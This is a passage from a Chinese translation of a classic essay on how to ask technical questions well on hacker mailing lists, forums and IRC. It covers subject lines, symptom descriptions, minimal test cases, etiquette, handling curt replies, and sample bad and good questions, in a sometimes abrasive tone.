或者许可书以明确你的问题是否切题。发贴前先翻翻已有的帖子，这样可以让你感受一下那里行事的方式。事实上，张贴前在新闻组或邮件列表的历史文档中搜索与你问题相关的关键词是个极好的主意，也许就找到答案了。即使没有，也能帮助你归纳出更好的问题。 别象机关枪似的一次性“扫射”所有的帮助渠道，这就象大喊大叫一样会令人不快，温柔地一个一个来。 弄懂主题！最典型的错误之一是在某种致立于跨平台可移植的语言、库或工具的论坛中提关于 Unix 或 Windows 操作系统程序接口的问题。如果你不明白为什么这是大错，最好在搞清楚概念前什么也别问。 一般来说，在仔细挑选的公共论坛中提问比在私有论坛中提同样的问题更容易得到有用的回答。有几个道理支持这点，一是看潜在的回复者有多少，二是看论坛的参与者有多少，黑客更愿回答能启发多数人的问题。 可以理解，老练的黑客和一些流行软件的作者正在承受过多的不当消息。就象那根最后压垮骆驼背的稻草一样，你的加入也有可能使情况走向极端──已经好几次了，一些流行软件的作者退出了对自己软件的支持，因为伴随而来的涌入其私人邮箱的垃圾邮件变得无法忍受。 面向新手的论坛和互联网中继聊天（IRC）通常响应最快 本地的用户组织或者你所用的 Linux 发行版也许正在宣传新手取得帮助的论坛或 IRC 通道（在一些非英语国家，新手论坛很可能还是邮件列表），这些地方是开始提问的好去处，特别是当你觉得遇到的也许只是相对简单或者很普通的问题时。经过宣传的 IRC 通道是公开邀请提问的地方，通常可以得到实时的回复。 事实上，如果出问题的程序来自某发行版（这很常见），最好先去该发行版的论坛或邮件列表中提问，再到程序本身的项目论坛或邮件列表，（否则）该项目的黑客可能仅仅回复“用 我们的 代码”。 在任何论坛发贴以前，先看看有没有搜索功能。如果有，就试着用问题的几个关键词搜索一下，也许就有帮助。如果在此之前你已做过全面的网页搜索（你应该这样去做），还是再搜索一下论坛，搜索引擎有可能没来得及索引此论坛的全部内容。 通过论坛或 IRC 通道提供项目的用户支持有增长的趋势，电子邮件交流则更多地为项目开发者保留。所以先在论坛或 IRC 中寻求与该项目相关的帮助。 第二步，使用项目的邮件列表 当某个项目存在开发者邮件列表时，要向列表而不是其中的个别成员提问，即使你确信他能最好地回答你的问题。查一查项目的文档和主页，找到项目的邮件列表并使用它。采用这种办法有几个很好的理由： 向个别开发者提的问题（如果）足够好，也将对整个项目组有益。相反，如果你认为自己的问题对整个项目组来说太愚蠢，这也不能成为骚扰个别开发者的理由。 向列表提问可以分散开发者的负担，个别开发者（尤其是项目领导）也许太忙以至于没法回答你的问题。 大多数邮件列表都要存档，那些存档将被搜索引擎索引，如果你向列表提问并得到解答，将来其它人可以通过网页搜索找到你的问题和答案，也就不用再次发问了。 如果某些问题经常被问到，开发者可以利用此信息改进文档或软件本身，以使其更清楚。如果只是私下提问，就没有人能看到最常见问题的完整场景。 如果一个项目既有 “用户” 也有“开发者”（或 “黑客”）邮件列表或论坛，而你又不摆弄那些代码，向“用户”列表或论坛提问。不要假设自己会在开发者列表中受到欢迎，那些人多半会遭受你的噪音干扰。 然尔，如果你 确信 你的问题不一般，而且在“用户” 列表或论坛中几天都没有回复，可以试试“开发者”列表或论坛。建议你在张贴前最好先暗暗地观察几天,至少看看最近几天保存的帖子,以了解那的行事方式（事实上这是参与任何私有或半私有列表的好主意） 如果你找不到一个项目的邮件列表，而只能查到项目维护者的地址，只管向其发信。即便在这种情况下，也别假设（项目）邮件列表不存在。在你的电子邮件中陈述你已经试过但没有找到合适的邮件列表，也提及你不反对将自己的邮件转发给他人（许多人认为，即使没什么秘密，私人电子邮件也不应该被公开。通过允许将你的电子邮件转发他人，你给了相应人员处置你邮件的选择）。 使用有意义且明确的主题 在邮件列表、新闻组或论坛中，主题是你在五十个或更少的字以内吸引有资格专家注意的黄金机会，不要用诸如 “请帮我” （更别提大写的 “请帮我！！！！”，这种主题的消息会被条件反射式地删掉）之类的唠叨浪费机会。不要用你痛苦的深度来打动我们，相反，要在这点空间中使用超级简明扼要的问题描述。 使用主题的好惯例是“对象──偏差”（式的描述），许多技术支持组织就是这样做的。在“对象”部分指明是哪一个或哪一组东西有问题，在“偏差”部分则描述与期望的行为不一致的地方。 愚蠢： 救命啊！我的笔记本视频工作不正常！ 明智： X.org 6.8.1 扭曲鼠标光标，MV1005 型号的某显卡芯片组 更明智： 使用 MV1005 型号的某显卡芯片组在 X.org 6.8.1 的鼠标光标被扭曲 编写 “对象──偏差”式描述的过程有助于你组织对问题的细致思考。是什么被影响了？仅仅是鼠标光标或者还有其它图形？只在 X.org 中出现？或只是在其 6.8.1 版中？是针对某显卡芯片组？或者只是其中的 MV1005 型号？一个黑客只需描一眼就能够立即明白什么是你遇到的问题，什么是你自己的问题。 更一般地，想象一下在一个只显示主题的文档索引中查找。让你的主题更好地反映问题，可以使下一个搜索类似问题的人能够在文档中直接就找到答案的线索，而不用再次发贴提问。 如果你想在回复中提问，确保改变主题以表明你是在问一个问题，一个主题象 Re: 测试 或者 Re: 新Bug 的消息不太可能引起足够的注意。同时，将回复中与新主题不甚相关的引用内容尽量删除。 对于列表消息，不要直接点击回复（按钮）来开始一个全新的线索，这将限制你的观众。有些邮件阅读程序，比如 mutt，允许用户按线索排序并通过折叠线索来隐藏消息，这样做的人永远看不到你发的消息。 仅仅改变主题还不够。mutt 和其它一些邮件阅读程序还要检查邮件头主题以外的其它信息，以便为其指定线索，所以宁可发一个全新的邮件。 在论坛，因为消息与特定的线索紧密结合，并且通常在线索之外不可见，好的提问方式略有不同，通过回复提问并不要紧。不是所有论坛都允许在回复中出现分离的主题，而且这样做了基本上没有人会去看。不过，通过回复提问本身就是令人怀疑的做法，因为它们只会被正在查看该线索的人读到。所以，除非你 只想 在该线索当前活跃的人群中提问，还是另起炉灶比较好。 使问题容易回复 以请向……回复来结束问题多半会使你得不到回答。如果你觉得花几秒钟在邮件客户端设置一下回复地址都麻烦，我们也觉得花几秒钟考虑你的问题更麻烦。如果你的邮件客户端程序不支持这样做，换个好点的；如果是操作系统不支持所有这种邮件客户端程序，也换个好点的。 在论坛，要求通过电子邮件回复是完全无礼的，除非你确信回复的信息也许是敏感的（而且有人会为了某些未知的原因，只让你而不是整个论坛知道答案）。如果你只是想在有人回复线索时得到电子邮件提醒，可以要求论坛发送。几乎所有论坛都支持诸如留意本线索、有回复发送邮件等功能。 用清晰、语法、拼写正确的语句书写 经验告诉我们，粗心与草率的作者通常也粗心与草率地思考和编程（我敢打赌）。为这些粗心与草率的思考者回答问题没有什么好处，我们宁可将时间花在其它地方。 清楚、良好地表达你的问题非常重要。如果你觉得这样做麻烦，我们也觉得注意（你的问题）麻烦。花点额外的精力斟酌一下字句，用不着太僵硬与正式──事实上，黑客文化很看重能准确地使用非正式、俚语和幽默的语句。但它 必须 很准确，而且有迹象表明你是在思考和关注问题。 正确地拼写、使用标点和大小写，不要将 its 混淆为 it's，loose 搞成 lose 或者将 “discrete” 弄成 “discreet”。不要全部用大写，这会被视为无礼的大声嚷嚷 （全部小写也好不到哪去，因为不易阅读。Alan Cox [注：著名黑客，Linux 内核的重要参与者] 也许可以这样做，但你不行。） 一般而言，如果你写得象个半文盲似的傻子，多半得不到理睬。也不要使用即时通讯中的简写，如将 you 简化为 u 会使你看起来象一个为了节约二次击键的半文盲式的傻子。更糟的是，如果象个小孩似地鬼画桃符那绝对是在找死，可以肯定没人会理你（或者最多是给你一大堆指责与挖苦）。 如果在非母语论坛提问，你的拼写与语法错误会得到有限的宽容，但懒惰完全不会被容忍（是的，我们通常看得出其中的差别）。同时，除非你知道回复者使用的语言，请使用英语书写。繁忙的黑客一般会直接删除用他们看不懂语言写的消息。在互联网上英语是工作语言，用英语书写可以将你的问题不被阅读就被直接删除的可能性降到最低。 如果你用英语书写但它是你的第二语言，最好提醒潜在的回复者语言上可能的困难以便绕过这个问题，比如： 英语不是我的母语，请谅解拼写错误。 如果您使用某某语言，请电邮/私聊我，也许我需要您的协助翻译我的问题。 对于这个技术术语本身我很熟悉，但对于它的一些俚语或习惯表达方式就不太明白了。 我已经同时用某某语及英语提问，如果您使用两者之一回复，我很乐意翻译。 使用易于读取且标准的文件格式发送问题 如果你人为地将问题搞得难以阅读，它多半会被忽略，人们更愿读易懂的问题，所以： 使用纯文本而不是 HTML（超文本标注语言）（ 关闭HTML 并不难） 使用 MIME（多用途互联网邮件扩展）附件通常没有问题，前提是真正有内容（譬如附带的源文件或补丁），而不仅仅是邮件客户端程序生成的模板（譬如只是消息内容的拷贝）。 不要发送整段只是单行句子但多次折回的邮件（这使得回复部分内容非常困难）。设想你的读者是在80个字符宽的文本终端阅读邮件，设置你的行折回点小于 80 列。 但是，也 不要 用任何固定列折回数据（譬如日志文件拷贝或会话记录）。数据应该原样包含，使回复者确信他们看到的是与你看到的一样的东西。 在英语论坛中，不要使用'Quoted-Printable' MIME 编码发送消息。这种编码对于张贴非 ASCII 语言可能是必须的，但很多邮件程序并不支持。当它们分断时，那些文本中四处散布的 “=20”符号既难看也分散注意力，甚至有可能破坏内容的语意。 永远不要 指望黑客们阅读使用封闭的专用格式编写的文档，诸如微软公司的 Word 或 Excel 文件等。大多数黑客对此的反应就象有人将还在冒热气的猪粪倒在你门口时你的反应一样。即使他们能够处理，也很厌恶这么做。 如果你从使用视窗的电脑发送电子邮件，关闭问题颇多的微软“聪明引用”功能（在“工具” -&gt; “自动纠正选项”的“输入时自动格式化”下去掉聪明引用的选框），以免在你的邮件中到处散布垃圾字符。 在论坛，勿滥用“表情符号”和“HTML”功能(当它们提供时)。一两个表情符号通常没有问题，但花哨的彩色文本倾向于使人认为你是个无能之辈。过滥地使用表情符号、色彩和字体会使你看来象个傻笑的小姑娘。这通常不是个好主意，除非你只是对性而不是有用的回复更有兴趣。 如果你使用图形用户界面的邮件客户端程序(如网景公司的 Messenger、微软公司的 Outlook 或者其它类似的)，注意它们的缺省配置不一定满足这些要求。大多数这类程序有基于菜单的查看源码命令，用它来检查发送文件夹中的消息，以确保发送的是没有多余杂质的纯文本文件。 描述问题应准确且有内容 仔细、清楚地描述问题的症状 描述问题发生的环境(主机、操作系统、应用程序，任何相关的)，提供销售商的发行版和版本号（如：“Fedora Core 7”、“Slackware 9.1”等） 描述提问前做过的研究及其理解。 描述提问前为确定问题而采取的诊断步骤。 描述最近对计算机或软件配置的任何相关改变。 如果可能，提供在可控环境下重现问题的方法。 尽最大努力预测黑客会提到的问题，并提前备好答案。 如果你认为是代码有问题，向黑客提供在可控环境下重现问题的方法尤其重要。当你这么做时，得到有用且及时回复的可能性将大大增加。 西蒙.泰瑟姆（Simon Tatham）写过一篇《如何有效报告Bug》的文章，我强烈推荐各位阅读。 量不在多，精炼则灵 你应该（写得）精炼且有内容，简单地将一大堆代码或数据罗列在求助消息中达不到目的。如果你有一个很大且复杂的测试样例让程序崩溃，尝试将其裁剪得越小越好。 至少有三个理由支持这点。第一，让别人看到你在努力简化问题使你更有可能得到回复。第二，简化问题使你更有可能得到 有用的 回复。第三，在提纯Bug报告的过程中，你可能自己就找到了解决办法或权宜之计。 别急于宣称找到Bug 当你在一个软件中遇到问题，除非你 非常、非常 的有根据，不要动辄声称找到了Bug。提示：除非你能提供解决问题的源代码补丁，或者对前一版本的回归测试表现出不正确的行为，否则你都多半不够完全确信。对于网页和文档也如此，如果你（声称）发现了文档的“Bug”，你应该能提供相应位置的替代文本。 记住，还有许多其它用户并未经历你遇到的问题，否则你在阅读文档或搜索网页时就应该发现了（[你在报怨前已经做了这些，是吧 ？](#你在报怨前已经做了这些，是吧 ？)）。这也意味着很有可能是你弄错了而不是软件本身有问题。 编写软件的人总是非常辛苦地使它尽可能完美。如果你声称找到了Bug，也就置疑了他们的能力，即使你是对的，也有可能会使其中的部分人感到不快。（此外，）在主题中嚷嚷“Bug”也是特别不老练的。 提问时，即使你私下非常确信已经发现一个真正的Bug，最好写得象是 你 做错了什么。如果真的有Bug，你会在回复中看到这点。这样做的话，如果真有虫子，维护者就会向你道歉，这总比你弄砸了然后欠别人一个道歉要强。 低声下气代替不了做自己的家庭作业 有些人明白他们不应该粗鲁或傲慢地行事并要求得到答复，但他们退到相反的低声下气的极端：“我知道我只是个可怜的新丁，一个失败者，但……”。这既使人困扰，也没有用，当伴随着对实际问题含糊的描述时还特别令人反感。 别用低级灵长类动物的办法浪费你我的时间，相反，尽可能清楚地描述背景情况和你的问题，这比低声下气更好地摆正了你的位置。 有时，论坛设有单独的初学者提问版面，如果你真的认为遇到了肤浅的问题，到那去就是了，但一样别低声下气。 描述问题症状而不是猜测 告诉黑客是什么导致了问题是没用的（如果你的诊断理论是了不起的东西，你还会向别人咨询求助吗？）。所以，确保只是告诉他们问题的原始症状，而不是你的解释和理论，让他们来解释和诊断。如果你认为陈述自己的猜测很重要，应清楚地说明这只是你的猜测并描述为什么它们不起作用。 愚蠢： 我在编译内核时接连遇到 SIG11 错误，怀疑主板上的某根电路丝断了，找到它们的最好办法是什么？ 明智： 我组装的电脑（K6/233 CPU、FIC-PA2007 主板[威盛 Apollo VP2 芯片组]、Corsair PC133 SDRAM 256Mb 内存）最近在开机 20 分钟左右、做内核编译时频繁地报 SIG11 错，但在头 20 分钟内从不出问题。重启动不会复位时钟，但整夜关机会。更换所有内存未解决问题，相关的典型编译会话日志附后。 由于以上这点许多人似乎难以掌握，这里有句话可以提醒你：“所有的诊断专家都来自密苏里州”。美国国务院的官方座右铭则是“让我看看”（出自国会议员威勒德.D.范迪弗［Willard D. Vandiver］在1899年时的讲话：“我来自一个出产玉米、棉花、牛蒡和民主党人的国家，滔滔雄辩既不能说服我，也不会让我满意。我来自密苏里州，你必须让我看看。”）针对诊断者而言，这并不是怀疑，而只是一种真实而有用的需求，以便让他们看到与你看到的原始证据尽可能一致的东西，而不是你的猜测与总结。（所以，）让我们看看。 按时间先后罗列问题症状 刚出问题之前发生的事情通常包含有解决问题最有效的线索。所以，记录中应准确地描述你、电脑和软件在崩溃前都做了什么。在命令行处理的情况下，有会话日志（如运行脚本工具生成的）并引用相关的若干（如20）行记录会非常有帮助。 如果崩溃的程序有诊断选项（如-v详述开关），试着选择这些能在记录中增加排错信息的选项。记住，“多”不等于“好”。试着选取适当的排错级别以便提供有用的信息而不是将阅读者淹没在垃圾中。 如果你的记录很长（如超过四段），在开头简述问题随后按时间先后罗列详细过程也许更有用。这样，黑客在读你的记录时就知道该注意哪些内容了。 描述目标而不是过程 如果你想弄清楚如何做某事（而不是报告一个Bug），在开头就描述你的目标，然后才陈述遇到问题的特定步骤。 经常出现这种情况，寻求技术帮助的人在脑袋里有个更高层次的目标，他们在自以为能达到目标的特定道路上被卡住了，然后跑来问该怎么走，但没有意识到这条路本身有问题，结果要费很大的劲才能通过。 愚蠢： 我怎样才能让某图形程序的颜色拾取器取得十六进制的 RGB 值？ 明智： 我正试着用自己选定数值的颜色替换一幅图片的色表，我现在知道的唯一方法是编辑每个表槽，但却无法让某图形程序的颜色拾取器取得十六进制的 RGB 值。 第二种提法是明智的，它使得建议采用更合适的工具以完成任务的回复成为可能。 别要求私下回复电邮 黑客们认为问题的解决过程应该公开、透明，此过程中如果更有才能的人注意到不完整或者不当之处，最初的回复才能够、也应该被纠正。同时，作为回复者也因为能力和学识被其它同行看到而得到某种回报。 当你要求私下回复时，此过程和回报都被中止。别这样做，让 回复者 来决定是否私下回答──如果他真这么做了，通常是因为他认为问题编写太差或者太肤浅，以至于对其它人毫无意义。 对这条规则存在一条有限的例外，如果你确信提问可能会引来大量雷同的回复时，那么“向我发电邮，我将为论坛归纳这些回复”将是神奇的句子。试着将邮件列表或新闻组从洪水般雷同的回复中解救出来是非常有礼貌的──但你必须信守诺言。 提问应明确 漫无边际的问题通常也被视为没有明确限制的时间无底洞。最有可能给你有用答案的人通常也是最忙的人（假如只是因为他们承担了太多工作的话），这些人对于没有止境的时间无底洞极其敏感，所以他们也倾向于讨厌那些漫无边际的问题。 如果你明确了想让回复者做的事（如指点方向、发送代码、检查补丁或其它），你更有可能得到有用的回复。（因为）这样可以让他们集中精力并间接地设定了他们为帮助你需要花费的时间和精力上限，这很好。 要想理解专家生活的世界，可以这样设想：那里有丰富的专长资源但稀缺的响应时间。你暗中要求他们奉献的时间越少，你越有可能从这些真正懂行也真正很忙的专家那里得到解答。 所以限定你的问题以使专家回答时需要付出的时间最少──这通常与简化问题还不太一样。举个例，“请问可否指点一下哪有好一点的 X 解释？”通常要比“请解释一下 X”明智。如果你的代码不运行了，通常请别人看看哪有问题比叫他们帮你改正更明智。 关于代码的问题 别要求他人给你出问题的代码排错而不提及应该从何入手。张贴几百行的代码，然后说一声“它不能运行”会让你得不到理睬。只贴几十行代码，然后说一句“在第七行以后，本应该显示，但实际出现的是”非常有可能让你得到回复。 最精确描述代码问题的方法是提供一个能展示问题的最小测试样例。什么是最小测试样例？它是对问题的展现，只需要刚好能够重现非预期行为的代码即可。如何生成一个最小测试样例？如果你知道哪一行或哪一段代码会产生问题，将其复制并提供刚好够用的外围支撑代码以构成一个完整的样例（够用是指源码刚好能被编译器、解释器或任何处理它的程序所接受）。如果你不能将问题缩小到特定的段落，复制源码并去除那些与问题无关的代码段。你能提供的最小测试样例越小越好（参见 量不在多，精炼则灵 ）。 生成一个非常小的最小测试样例并不总是可能，但尽力去做是很好的锻练，这有可能帮助你找到需要自己解决的问题。即使你找不到，黑客们喜欢看到你努力过，这将使他们更合作。 如果你只是想让别人帮忙审一下代码，在最开头就要说出来，并且一定要提到你认为哪一部分特别需要关注以及为什么。 别张贴家庭作业式问题 黑客们善于发现“家庭作业”式的问题。我们中的大多数人已经做了自己的家庭作业，那是该 你 做的，以便从中学到东西。问一下提示没有关系，但不是要求完整的解决方案。 如果你怀疑自己碰到了一个家庭作业式的问题，但仍然无法解决，试试在用户组、论坛或（作为最后一招）在项目的“用户”邮件列表或论坛中提问。尽管黑客们 会 看出来，一些老用户也许仍会给你提示。 删除无意义的要求 抵制这种诱惑，即在求助消息末尾加上诸如“有人能帮我吗？”或“有没有答案？”之类在语义上毫无意义的东西。第一，如果问题描述还不完整，这些附加的东西最多也只能是多余的。第二，因为它们是多余的，黑客们会认为这些东西烦人──就很有可能用逻辑上无误但打发人的回复，诸如“是的，你可以得到帮助”和“不，没有给你的帮助”。 一般来说，避免提“是或否”类型的问题，除非你想得到 “是或否”类型的回答。 不要把问题标记为“紧急”，即使对你而言的确如此 这是你的问题，不要我们的。宣称“紧急”极有可能事与愿违：大多数黑客会直接删除这种消息，他们认为这是无礼和自私地企图得到即时与特殊的关照。而且“紧急”或其它有类似含义的主题有可能触发垃圾过滤规则，潜在的回复者可能永远看不到你的问题！ 有一点点局部的例外，如果你是在一些知名度很高、会使黑客们激动的地方使用程序，也许值得这样去做。在这种情况下，如果你有期限压力，也很有礼貌地提到这点，人们也许会有足够的兴趣快一点回答。 当然，这是非常冒险的，因为黑客们对什么是令人激动的标准多半与你的不同。譬如从国际空间站这样张贴没有问题，但代表感觉良好的慈善或政治原因这样做几乎肯定不行。事实上，张贴诸如“紧急：帮我救救这个毛绒绒的小海豹！”肯定会被黑客回避或光火，即使他们认为毛绒绒的小海豹很重要。 如果你觉得这不可思议，再把剩下的内容多读几遍，直到弄懂了再发贴也不迟。 礼貌总是有益的 礼貌一点，使用 请 和 谢谢你的关注 或者 谢谢你的关照，让别人明白你感谢他们无偿花时间帮助你。 坦率地讲，这一点没有语法正确、文字清晰、准确、有内容和避免使用专用格式重要（同时也不能替代它们）。黑客们一般宁可读有点唐突但技术鲜明的Bug报告，而不是那种有礼但含糊的报告。（如果这点让你不解，记住我们是按问题能教我们什么来评价它的） 然尔，如果你已经谈清楚了技术问题，客气一点肯定会增加你得到有用回复的机会。 （我们必须指出，本文唯一受到一些老黑客认真反对的地方是以前曾经推荐过的“提前谢了”，一些黑客认为这隐含着事后不用再感谢任何人的暗示。我们的建议是要么先说 提前谢了，事后 再 对回复者表示感谢，要么换种方式表达，譬如用 谢谢你的关注 或 谢谢你的关照）。 问题解决后追加一条简要说明 问题解决后向所有帮助过的人追加一条消息，让他们知道问题是如何解决的并再次感谢。如果问题在邮件列表或新闻组中受到广泛关注，在那里追加此消息比较恰当。 最理想的方式是向最初提问的线索回复此消息，并在主题中包含 已解决、已搞定 或其它同等含义的明显标记。在人来人往的邮件列表里，一个看见线索 问题 X 和 问题 X-已解决 的潜在回复者就明白不用再浪费时间了（除非他个人觉得“问题 X”有趣），因此可以利用此时间去解决其它问题。 追加的消息用不着太长或太复杂，一句简单的“你好──是网线坏了！谢谢大家──比尔”就比什么都没有要强。事实上，除非解决问题的技术真正高深，一条简短而亲切的总结比长篇大论要好。说明是什么行动解决了问题，用不着重演整个排错的故事。 对于有深度的问题，张贴排错历史的摘要是恰当的。描述问题的最终状态，说明是什么解决了问题，在此之后 才指明可以避免的弯路。应避免的弯路部分应放在正确的解决方案和其它总结材料之后，而不要将此消息搞成侦探推理小说。列出那些帮助过你的名字，那样你会交到朋友的。 除了有礼貌、有内容以外，这种类型的追帖将帮助其他人在邮件列表、新闻组或论坛文档中搜索到真正解决你问题的方案，从而也让他们受益。 最后，此类追帖还让每位参与协助的人因问题的解决而产生一种满足感。如果你自己不是技术专家或黑客，相信我们，这种感觉对于你寻求帮助的老手和专家是非常重要的。问题叙述到最后不知所终总是令人沮丧的，黑客们痒痒地渴望它们被解决。挠痒痒 为你挣到的信誉将对你下次再次张贴提问非常非常的有帮助。 考虑一下怎样才能避免他人将来也遇到类似的问题，问问自己编一份文档或 FAQ 补丁会不会有帮助，如果是的话就将补丁发给维护者。 在黑客中，这种良好的后继行动实际上比传统的礼貌更重要，也是你善待他人而赢得声誉的方式，这是非常有价值的财富。 如何解读回答 “读读该死的手册”（RTFM）和“搜搜该死的网络”（STFW）：如何明白你已完全搞砸 有一个古老而神圣的传统：如果你收到 读读该死的手册（RTFM） 的回复，发信人认为你应该去“读读该死的手册”。他或她多半是对的，去读一下吧。 “读读该死的手册”（RTFM）有个年轻一点的亲戚，如果你收到“搜搜该死的网络”（STFW）的回复，发信人认为你应该“搜搜该死的网络”。那人多半也是对的，去搜一下吧。(更温和一点的说法是“谷歌是你的朋友！”) 在论坛，你也可能被要求去搜索论坛的文档。事实上，有人甚至可能热心地为你提供以前解决此问题的线索。但不要依赖这种关照，提问前应该先搜索一下文档。 通常，叫你搜索的人已经打开了能解决你问题的手册或网页，正在一边看一边敲键盘。这些回复意味着他认为： 第一，你要的信息很容易找到。 第二，自已找要比别人喂到嘴里能学得更多。 你不应该觉得这样就被冒犯了，按黑客的标准，回复者没有不理你就是在向你表示某种尊敬，你反而应该感谢他热切地想帮助你。 如果还不明白…… 如果你看不懂回答，不要马上回复一个要求说明的消息，先试试那些最初提问时用过的相同工具（如手册、FAQ、网页、懂行的朋友等）试着搞懂回答。如果还是需要说明，展现你已经明白的。 譬如，假如我告诉你：“看起来象是某输入项有问题，你需要清除它”，接着是个 不好 的回帖：“什么是某输入项？”。而这是一个 很好 的跟帖：“是的，我读了手册，某某输入项只在 -z 和 -p 开关中被提到，但都没有涉及到如何清除它们，你指的是哪一个还是我弄错了什么？” 对待无礼 很多黑客圈子中看似无礼的行为并不是存心冒犯。相反，它是直接了当、一针见血式的交流风格，这种风格对于更关注解决问题而不是使别人感觉舒服而混乱的人是很自然的。 如果你觉得被冒犯了，试着平静地反应。如果有人真的做了过格的事，邮件列表、新闻组或论坛中的前辈多半会招呼他。如果这 没有 发生而你却光火了，那么你发火对象的言语可能在黑客社区中看起来是正常的，而 你 将被视为有错的一方，这将伤害到你获取信息或帮助的机会。 另一方面，你会偶而真的碰到无礼和无聊的言行。与上述相反，对真正的冒犯者狠狠地打击、用犀利的语言将其驳得体无完肤都是可以接受的。然尔，在行事之前一定要非常非常的有根据。纠正无礼的言论与开始一场毫无意义的口水战仅一线之隔，黑客们自己莽撞地越线的情况并不鲜见。如果你是新手或外来者，避开这种莽撞的机会并不高。如果你想得到的是信息而不是消磨时光，这时最好不要把手放在键盘上以免冒险。 （有些人断言很多黑客都有轻度的自闭症或阿斯伯格综合症，缺少用于润滑人类社会“正常”交往所需的脑电路。这既可能是真也可能是假。如果你自己不是黑客，兴许你认为我们脑袋有问题还能帮助你应付我们的古怪行为。只管这么干好了，我们不在乎。我们 喜欢 现在这个样子，并且一般都对病号标记有站得住脚的怀疑。） 在下一节，我们会谈到另一个问题，当 你 行为不当时会受到的“冒犯”。 别象失败者那样反应 在黑客社区的论坛中有那么几次你可能会搞砸──以本文描述或类似的方式。你会被示众是如何搞砸的，也许言语中还会带点颜色。 这种事发生以后，你能做的最糟糕的事莫过于哀嚎你的遭遇、宣称被口头攻击、要求道歉、高声尖叫、憋闷气、威胁诉诸法律、向其雇主报怨、忘了关马桶盖等等。相反，你该这样去做： 熬过去，这很正常。事实上，它是有益健康与恰当的。 社区的标准不会自己维持，它们是通过参与者积极而 公开 地执行来维持的。不要哭嚎所有的批评都应该通过私下的邮件传送，这不是事情运作的方式。当有人评论你的一个说法有误或者提出不同看法时，坚持声称受到个人攻击也毫无益处，这些都是失败者的态度。 也有其它的黑客论坛，受过高礼节要求的误导，禁止参与者张贴任何对别人帖子挑毛病的消息，并声称“如果你不想帮助用户就闭嘴”。有思路的参与者纷纷离开的结果只会使它们变成了毫无意义的唠叨与无用的技术论坛。 是夸张的“友谊”（以上述方式）还是有用？挑一个。 记着：当黑客说你搞砸了，并且(无论多么刺耳地)告诉你别再这样做时，他正在为关心你和他的社区而行动。对他而言，不理你并将你从他的生活中滤除要容易得多。如果你无法做到感谢，至少要有点尊严，别大声哀嚎，也别因为自己是个有戏剧性超级敏感的灵魂和自以为有资格的新来者，就指望别人象对待脆弱的洋娃娃那样对你。 有时候，即使你没有搞砸（或者只是别人想象你搞砸了）， 有些人也会无缘无故地攻击你本人。在这种情况下，报怨倒是 真的 会把问题搞砸。 这些找茬者要么是毫无办法但自以为是专家的不中用家伙，要么就是测试你是否真会搞砸的心理专家。其它读者要么不理睬，要么用自己的方式对付他们。这些找茬者在给自己找麻烦，这点你不用操心。 也别让自己卷入口水战，大多数口水战最好不要理睬──当然，是在你核实它们只是口水战、没有指出你搞砸的地方，而且没有巧妙地将问题真正的答案藏于其中之后（这也是可能的）。 提问禁忌 下面是些典型的愚蠢问题和黑客不回答它们时的想法。 问：我到哪可以找到某程序或 X 资源？ 问：我怎样用 X 做 Y？ 问：如何配置我的 shell 提示？ 问：我可以用 Bass-o-matic 文件转换工具将 AcmeCorp 文档转为 TeX 格式吗？ 问：我的{程序、配置、SQL 语句}不运行了 问：我的视窗电脑出问题了，你能帮忙吗？ 问：我的程序不运行了，我认为系统工具X有问题 问：我安装 Linux 或 X 遇到困难，你能帮忙吗？ 问：我如何才能破解超级用户口令/盗取通道操作员的特权/查看某人的电子邮件？ 问： 我到哪可以找到某程序或 X 资源？ 答： 在我找到它的同样地方，笨旦──在网页搜索引擎上。上帝啊，难道还有人不知道如何使用 谷歌 吗？ 问： 我怎样用 X 做 Y？ 答： 如果你想解决的是 Y，提问时别给出可能并不恰当的方法。这种问题说明提问者不但对 X 完全无知，也对要解决的 Y 问题糊涂，还被特定形势禁锢了思维。等他们把问题弄好再说。 问： 如何配置我的 shell 提示？ 答： 如果你有足够的智慧提这个问题，你也该有足够的智慧去 “读读该死的手册”（RTFM），然后自己去找出来。 问： 我可以用 Bass-o-matic 文件转换工具将 AcmeCorp 文档转为 TeX 格式吗？ 答： 试试就知道了。如果你试过，你既知道了答案，又不用浪费我的时间了。 问： 我的{程序、配置、SQL 语句}不运行了 答： 这不是一个问题，我也没有兴趣去猜你有什么问题──我有更要紧的事要做。看到这种东西，我的反应一般如下： 你还有什么补充吗？ 噢，太糟了，希望你能搞定。 这跟我究竟有什么关系？ 问： 我的视窗电脑出问题了，你能帮忙吗？ 答： 是的，把视窗垃圾删了，装个象 Linux 或 BSD 的开源操作系统吧。 注意：如果程序有官方的视窗版或者与视窗有交互(如 Samba)，你 可以 问与视窗相关的问题，只是别对问题是由视窗操作系统而不是程序本身造成的回复感到惊讶，因为视窗一般来说太差，这种说法一般都成立。 问： 我的程序不运行了，我认为系统工具 X 有问题 答： 你完全有可能是第一个注意到被成千上万用户反复使用的系统调用与库文件有明显缺陷的人，更有可能的是你完全没有根据。不同凡响的说法需要不同凡响的证据，当你这样声称时，你必须有清楚而详尽的缺陷说明文档作后盾。 问： 我安装 Linux 或 X 遇到困难，你能帮忙吗？ 答： 不行，我需要亲手操作你的电脑才能帮你排错，去向当地的 Linux 用户组寻求方便的帮助（你可以在 这里 找到用户组列表） 注意：如果安装问题与某 Linux 发行版有关，在针对 它 的邮件列表、论坛或本地用户组织中提问也许是恰当的。此时，应描述问题的准确细节。在此之前，先用 “linux”和 所有 被怀疑的硬件 [作关键词] 仔细搜索。 问： 我如何才能破解超级用户口令/盗取通道操作员的特权/查看某人的电子邮件？ 答： 想做这种事情说明你是个卑劣的家伙，想让黑客教你做这种事情说明你是个白痴。 好问题与坏问题 最后，我将通过举例来演示提问的智慧。同样的问题两种提法，一种愚蠢，另一种明智。 愚蠢：我在哪能找到关于 Foonly Flurbamatic 设备的东西？ 这个问题在乞求得到 “搜搜该死的网络”（STFW） 式的回复。 明智： 我用谷歌搜索过“Foonly Flurbamatic 2600”，但没有找到什么有用的，有谁知道在哪能找到这种设备的编程信息？ 这个人已经搜索过网络了，而且听起来他可能真的遇到了问题。 愚蠢： 我不能编译某项目的源代码，它为什么这么破？ 提问者假设是别人搞砸了，太自大了。 明智： 某项目的源代码不能在某 Linux 6.2 版下编译。我读了常见问题文档，但其中没有与某 Linux 相关的内容。这是编译时的记录，我做错了什么吗？ 提问者已经指明了运行环境，读了常见问题文档（FAQ），列出了错误，也没有假设问题是别人的过错，这家伙值得注意。 愚蠢： 我的主板有问题，谁能帮我？ 某黑客对此的反应可能是：“是的，还需要帮你拍背和换尿布吗？”，然后是敲下删除键。 明智： 我在 S2464 主板上试过 